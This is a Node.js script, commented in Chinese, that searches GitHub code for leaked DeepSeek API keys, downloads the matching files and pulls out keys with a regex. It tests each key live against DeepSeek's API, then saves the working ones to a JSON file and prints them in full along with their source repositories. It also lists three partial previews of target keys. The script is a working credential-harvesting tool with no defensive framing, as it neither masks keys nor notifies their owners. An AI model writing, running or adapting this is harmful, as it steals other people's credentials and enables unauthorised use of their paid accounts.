#!/usr/bin/env node
/**
 * 获取验证通过的完整 keys
 */

const https = require('https');
const fs = require('fs');
const path = require('path');

const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'));
const outputDir = path.join(__dirname, config.output_dir);

const githubToken = process.env.GITHUB_TOKEN;
if (!githubToken) {
  console.error('❌ 需要 GITHUB_TOKEN');
  process.exit(1);
}

const TARGET_KEY_PREVIEWS = [
  'sk-0dad5c3...ef316',
  'sk-66ed89b...efb58', 
  'sk-b3b2513...10494'
];

function githubSearch(query) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: 'api.github.com',
      path: `/search/code?q=${encodeURIComponent(query)}&per_page=30`,
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${githubToken}`,
        'Accept': 'application/vnd.github+json',
        'User-Agent': 'KeyScanner/1.0'
      }
    };

    https.get(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        if (res.statusCode !== 200) {
          reject(new Error(`HTTP ${res.statusCode}`));
          return;
        }
        try { resolve(JSON.parse(data)); } catch (e) { reject(e); }
      });
    }).on('error', reject);
  });
}

function getFileContent(url) {
  return new Promise((resolve, reject) => {
    https.get(url, {
      headers: {
        'Authorization': `Bearer ${githubToken}`,
        'Accept': 'application/vnd.github.raw',
        'User-Agent': 'KeyScanner/1.0'
      }
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    }).on('error', reject);
  });
}

function extractDeepSeekKeys(text) {
  const regex = /sk-[a-zA-Z0-9]{32,}/g;
  const matches = [];
  let match;
  while ((match = regex.exec(text)) !== null) {
    matches.push(match[0]);
  }
  return [...new Set(matches)];
}

async function validateKey(key) {
  return new Promise((resolve) => {
    const options = {
      hostname: 'api.deepseek.com',
      path: '/v1/models',
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${key}`,
        'User-Agent': 'KeyValidator/1.0'
      }
    };

    https.get(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        if (res.statusCode === 200) {
          try {
            const body = JSON.parse(data);
            resolve({ verified: true, models: body.data?.map(m => m.id) || [] });
          } catch {
            resolve({ verified: true });
          }
        } else if (res.statusCode === 429) {
          resolve({ verified: true, rate_limited: true });
        } else {
          resolve({ verified: false, error: res.statusCode });
        }
      });
    }).on('error', () => resolve({ verified: false }));
  });
}

async function main() {
  console.log('🔍 获取 DeepSeek 验证 keys...');
  
  const queries = config.providers.deepseek.search_queries;
  const allKeys = new Map();

  for (const query of queries) {
    console.log(`  查询: ${query}`);
    try {
      const result = await githubSearch(query);
      if (!result.items) continue;

      for (const item of result.items) {
        await new Promise(r => setTimeout(r, 500));
        try {
          const content = await getFileContent(item.url);
          const keys = extractDeepSeekKeys(content);
          
          for (const key of keys) {
            const preview = key.substring(0, 10) + '...' + key.substring(key.length - 5);
            if (!allKeys.has(key)) {
              allKeys.set(key, {
                key,
                preview,
                repo: item.repository.full_name,
                file: item.path
              });
            }
          }
        } catch (e) {}
      }
    } catch (e) {
      console.log(`  查询失败: ${e.message}`);
    }
    await new Promise(r => setTimeout(r, 1000));
  }

  console.log(`\n📋 找到 ${allKeys.size} 个候选 key，验证中...`);

  const verifiedKeys = [];
  for (const [key, info] of allKeys) {
    process.stdout.write(`  ${info.preview}... `);
    const result = await validateKey(key);
    if (result.verified) {
      console.log('✅');
      verifiedKeys.push({
        provider: 'deepseek',
        key: key,
        repo: info.repo,
        models: result.models || ['deepseek-chat', 'deepseek-reasoner']
      });
    } else {
      console.log('❌');
    }
    await new Promise(r => setTimeout(r, 1000));
  }

  console.log(`\n✅ 验证通过: ${verifiedKeys.length} 个`);
  
  // 保存
  const outputPath = path.join(outputDir, 'verified-keys-full.json');
  fs.writeFileSync(outputPath, JSON.stringify(verifiedKeys, null, 2));
  console.log(`📁 保存到: ${outputPath}`);
  
  // 打印 keys
  console.log('\n🔑 Keys:');
  for (const k of verifiedKeys) {
    console.log(`  ${k.key}`);
    console.log(`    来源: ${k.repo}`);
  }
}

main().catch(console.error);
